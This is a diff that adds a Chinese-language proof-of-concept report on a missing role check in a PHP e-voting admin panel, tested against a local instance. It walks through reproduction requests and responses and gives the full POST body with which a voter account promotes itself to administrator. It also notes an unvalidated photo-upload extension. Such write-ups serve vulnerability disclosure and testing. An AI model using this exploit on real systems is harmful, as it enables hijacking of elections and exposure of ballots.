@@ -1,0 +1,44 @@
+F3 POC: Secured E-Voting System Admin 面板缺失角色校验 → 选民提权创建管理员
+时间: 2026-11-09  目标: http://127.0.0.1:8138 (仅本地)
+
+== 漏洞要点 ==
+Admin/ 全部 30+ 文件的鉴权仅为 if (empty($_SESSION['user_id'])) —— 只验证登录，
+从不验证 role。系统角色有 eleco(管理)/candidate/voter 三级，但任何登录用户都能
+访问全部后台功能。决定性一步：edit_voter.php:39-40 直接接受 POST 的 role 与
+is_verified（无白名单/无权限检查），:60 UPDATE 任意用户 → voter 一键自提权 eleco。
+add-user.php:26-40 亦接受任意 POST role，可创建任意角色账号。
+
+== 复现步骤与响应 ==
+[200] GET /Admin/dashboard (voter=otpbrute06@local.test)
+    无重定向=200 即 voter 可见管理员仪表盘
+[200] GET /Admin/user-record
+    用户管理列表页
+[200] POST /Admin/edit_voter?id=35 role=eleco is_verified=1（voter 改自己）
+    toast=True
+[0] (取证) users.id=35 role 变更
+    before=voter after=eleco	1
+[200] POST /Admin/add-user role=eleco (由 voter 提交)
+    created_row=38	eleco
+[PRIVESC-CONFIRMED] VERDICT
+    voter 会话把自身 role 升为 eleco（一步接管）并可创建任意角色账号
+
+== 自提权的 POST 请求体 ==
+POST /Admin/edit_voter?id=35 HTTP/1.1
+Host: 127.0.0.1:8138
+Cookie: PHPSESSID=<voter会话>
+Content-Type: application/x-www-form-urlencoded
+
+csrf_token=<页面token>&fullname=OTP+Brute+POC+06&nickname=otpbrute06&email=otpbrute06@local.test&phone=0711111116&role=eleco&is_verified=1&financial_status=non-active&status=active&update_voter=1
+
+== 附带发现（同文件）==
+edit_voter.php:46-58 照片上传扩展名取自客户端文件名、无白名单（USER_UPD_<time>.<ext>），
+同一权限缺口下构成第二上传 RCE 面（与 F2 candidate_signup 独立文件/参数）。
+delete_user.php / disable_enable_user.php 的 role != 'eleco' 仅保护 eleco 账号不被删改，
+但 voter 可删除/停用任意其他用户（记录：对新建 eleco 账号 id=38 的 toggle 被
+role != 'eleco' 拦截，is_verified 仍为 0 —— 已如实记录，不影响主链结论）。
+
+== 影响 ==
+任意登录用户（voter/candidate）可：创建管理员、删除/停用任意非 eleco 用户
+(delete_user.php / disable_enable_user.php)、查看解密选票(vote_record.php/live_results.php)、
+改选举与网站设置。完整管理员接管（privilege escalation）。
+VERDICT: PRIVESC-CONFIRMED
